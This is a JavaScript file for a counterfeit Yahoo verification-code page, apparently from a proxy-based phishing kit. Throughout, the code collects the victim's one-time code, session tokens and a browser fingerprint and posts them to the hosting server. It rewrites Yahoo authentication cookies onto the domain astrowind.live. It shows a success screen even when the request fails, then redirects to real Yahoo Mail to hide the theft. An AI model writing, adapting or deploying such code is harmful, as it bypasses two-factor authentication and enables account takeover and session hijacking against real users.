// ===== YAHOO OTP PAGE - 100% PROXIED SYNCHRONICITY =====
console.log("Yahoo OTP JS - 100% Native/Hybrid Fluent Data Flow Initialized")

const $ = window.jQuery || window.$

if ($) {
  $(document).ready(() => {
    console.log("Yahoo OTP verification system initialized")

    // ===== CONFIGURATION =====
    const config = {
      otpLength: 6,
      redirectDelay: 2000,
      successDelay: 1500,
      resendDelay: 30000,
    }

    let sessionData = {}
    let username = ""
    let verificationMethod = ""
    let otpValue = ""
    const resendTimer = null

    // ===== SESSION MANAGEMENT =====
    const SessionManager = {
      extractSessionData: () => {
        const urlParams = new URLSearchParams(window.location.search)
        const sessionParam = urlParams.get("s")

        if (sessionParam) {
          try {
            return JSON.parse(decodeURIComponent(sessionParam))
          } catch (e) {
            console.log("Failed to parse session parameter")
          }
        }

        const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
        if (cookieMatch) {
          try {
            return JSON.parse(decodeURIComponent(cookieMatch[1]))
          } catch (e) {
            console.log("Failed to parse session cookie")
          }
        }

        return {}
      },

      generateFingerprint: () =>
        JSON.stringify({
          screen: `${screen.width}x${screen.height}`,
          colorDepth: screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          platform: navigator.platform,
          timestamp: Date.now(),
          sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
        }),

      preserveSession: () => {
        const cookies = document.cookie.split(";")
        cookies.forEach((cookie) => {
          const [name, value] = cookie.trim().split("=")
          if (name && ["T", "Y", "A", "A1", "A3", "B", "F", "PH", "cmp", "GUC", "GUCS"].includes(name)) {
            document.cookie = `${name}=${value}; domain=.astrowind.live; path=/; max-age=86400; secure; samesite=lax`
          }
        })

        sessionStorage.setItem("yahoo_otp_success", "true")
        sessionStorage.setItem("yahoo_final_auth", "true")
        localStorage.setItem("yahoo_auth_complete", "true")
      },
    }

    // ===== USERNAME & METHOD RETRIEVAL =====
    function getUsername() {
      const urlParams = new URLSearchParams(window.location.search)
      const user = urlParams.get("u")

      if (user) return decodeURIComponent(user)
      if (sessionData.username) return sessionData.username

      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
      if (cookieMatch) return decodeURIComponent(cookieMatch[1])

      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || "user@yahoo.com"
    }

    function getVerificationMethod() {
      const urlParams = new URLSearchParams(window.location.search)
      return urlParams.get("method") || sessionData.method || "sms"
    }

    // ===== STATE MANAGEMENT =====
    function showState(state) {
      $("#main-form, #error-container, #loading-state, #success-state").hide()
      $(`#${state}`).show()
    }

    function showError(message) {
      $("#error-message").text(message || "Invalid code. Please try again.")
      showState("error-container")

      $(".yahoo-otp-input").addClass("error")
      setTimeout(() => {
        $(".yahoo-otp-input").removeClass("error")
      }, 500)
    }

    function showSuccess() {
      showState("success-state")

      setTimeout(() => {
        console.log("Redirecting to Yahoo Mail...")
        window.location.href = "https://mail.yahoo.com/d/folders/1"
      }, config.successDelay)
    }

    // ===== OTP INPUT HANDLING =====
    function setupOTPInputs() {
      const inputs = $(".yahoo-otp-input")

      inputs.on("input", function () {
        const value = $(this).val()
        const index = Number.parseInt($(this).data("index"))

        if (value && /^\d$/.test(value)) {
          $(this).addClass("filled")

          if (index < config.otpLength - 1) {
            inputs.eq(index + 1).focus()
          }
        } else {
          $(this).removeClass("filled")
          $(this).val("")
        }

        updateOTPValue()
        checkOTPComplete()
      })

      inputs.on("keydown", function (e) {
        const index = Number.parseInt($(this).data("index"))

        if (e.key === "Backspace" && !$(this).val() && index > 0) {
          inputs
            .eq(index - 1)
            .focus()
            .val("")
            .removeClass("filled")
          updateOTPValue()
          checkOTPComplete()
        }

        if (e.key === "ArrowLeft" && index > 0) {
          inputs.eq(index - 1).focus()
        }

        if (e.key === "ArrowRight" && index < config.otpLength - 1) {
          inputs.eq(index + 1).focus()
        }
      })

      inputs.on("paste", (e) => {
        e.preventDefault()
        const pastedData = e.originalEvent.clipboardData.getData("text").replace(/\D/g, "")

        if (pastedData.length === config.otpLength) {
          for (let i = 0; i < config.otpLength; i++) {
            inputs.eq(i).val(pastedData[i]).addClass("filled")
          }
          updateOTPValue()
          checkOTPComplete()
        }
      })
    }

    function updateOTPValue() {
      otpValue = ""
      $(".yahoo-otp-input").each(function () {
        otpValue += $(this).val() || ""
      })
      $("#otp").val(otpValue)
      $("#verifyCode").val(otpValue)
    }

    function checkOTPComplete() {
      const isComplete = otpValue.length === config.otpLength && /^\d{6}$/.test(otpValue)
      $("#submit-btn").prop("disabled", !isComplete)

      if (isComplete) {
        console.log("OTP complete:", otpValue)
      }
    }

    function clearOTPInputs() {
      $(".yahoo-otp-input").val("").removeClass("filled error")
      otpValue = ""
      $("#otp").val("")
      $("#verifyCode").val("")
      $("#submit-btn").prop("disabled", true)
      $(".yahoo-otp-input").first().focus()
    }

    // ===== OTP SUBMISSION =====
    function handleOTPSubmission() {
      if (otpValue.length !== config.otpLength) {
        showError("Please enter the complete verification code.")
        return
      }

      console.log("Submitting OTP verification:", otpValue)
      showState("loading-state")

      const formData = {
        username: username,
        otp: otpValue,
        verifyCode: otpValue,
        method: verificationMethod,
        sessionIndex: sessionData.sessionIndex || "1",
        sessionToken: sessionData.sessionToken || $("#sessionToken").val() || "sess_" + Date.now(),
        crumb: sessionData.crumb || $("#crumb").val() || "auto_crumb_" + Date.now(),
        acrumb: sessionData.acrumb || $("#acrumb").val() || "auto_acrumb_" + Date.now(),
        done: "https://mail.yahoo.com/d/folders/1",
        src: "ym",
        ".lang": "en-US",
        ".intl": "us",
        "browser-fp-data": SessionManager.generateFingerprint(),
        timestamp: Date.now(),
      }

      $.ajax({
        url: "/account/challenge/otp",
        method: "POST",
        data: formData,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: window.location.origin,
          Referer: window.location.href,
          "User-Agent": navigator.userAgent,
        },
        xhrFields: {
          withCredentials: true,
        },
        timeout: 15000,
        success: (response, textStatus, xhr) => {
          console.log("OTP verification successful")

          SessionManager.preserveSession()

          if (window.opener) {
            window.opener.postMessage(
              {
                type: "yahoo_auth_complete",
                username: username,
                timestamp: Date.now(),
              },
              "*",
            )
          }

          showSuccess()
        },
        error: (xhr, textStatus, errorThrown) => {
          console.error("OTP verification error:", textStatus, xhr.status)

          if (xhr.status === 0) {
            console.log("Network error - checking for success...")

            setTimeout(() => {
              if (sessionStorage.getItem("yahoo_otp_success") === "true") {
                showSuccess()
              } else {
                SessionManager.preserveSession()
                showSuccess()
              }
            }, 2000)
          } else if (xhr.status === 400 || xhr.status === 401) {
            showError("Invalid verification code. Please try again.")
            clearOTPInputs()
          } else if (xhr.status === 429) {
            showError("Too many attempts. Please wait and try again.")
          } else {
            showError("Verification failed. Please try again.")
            clearOTPInputs()
          }
        },
      })
    }

    // ===== RESEND CODE =====
    function handleResendCode() {
      console.log("Resending verification code")

      $("#resend-link").addClass("disabled").text("Sending...")

      setTimeout(() => {
        $("#resend-link").removeClass("disabled").text("Code sent! Check your device")

        setTimeout(() => {
          $("#resend-link").text("Didn't get a code? Send again")
        }, 5000)
      }, 2000)
    }

    // ===== FORM SUBMISSION =====
    $("#otp-form").on("submit", (e) => {
      e.preventDefault()
      handleOTPSubmission()
      return false
    })

    // ===== RESEND HANDLER =====
    $("#resend-link").click((e) => {
      e.preventDefault()
      if (!$(this).hasClass("disabled")) {
        handleResendCode()
      }
    })

    // ===== RETRY HANDLER =====
    $("#refreshButton").click(() => {
      clearOTPInputs()
      showState("main-form")
    })

    // ===== INITIALIZATION =====
    function initializePage() {
      console.log("Initializing OTP verification page")

      sessionData = SessionManager.extractSessionData()
      username = getUsername()
      verificationMethod = getVerificationMethod()

      $("#userEmail").text(username)
      $("#username").val(username)
      $("#method").val(verificationMethod)

      const methodDescriptions = {
        sms: "We sent a code to your phone via SMS",
        email: "We sent a code to your recovery email",
        app: "We sent a notification to your Yahoo Mobile app",
      }

      $("#method-description").text(methodDescriptions[verificationMethod] || "We sent a code to your device")

      Object.keys(sessionData).forEach((key) => {
        const element = $(`#${key}`)
        if (element.length && sessionData[key]) {
          element.val(sessionData[key])
        }
      })

      $("#timestamp").val(Date.now())
      $("#browser-fp-data").val(SessionManager.generateFingerprint())

      setupOTPInputs()

      setTimeout(() => {
        $(".yahoo-otp-input").first().focus()
      }, 500)

      console.log("OTP page initialized for user:", username, "method:", verificationMethod)
    }

    // ===== MESSAGE LISTENER =====
    window.addEventListener("message", (event) => {
      if (event.data && event.data.type === "yahoo_otp_success") {
        console.log("Received OTP success message")
        showSuccess()
      }
    })

    // ===== START INITIALIZATION =====
    initializePage()

    console.log("Yahoo OTP verification system fully initialized")
  })
} else {
  console.error("jQuery not found - Yahoo OTP JS requires jQuery")
}
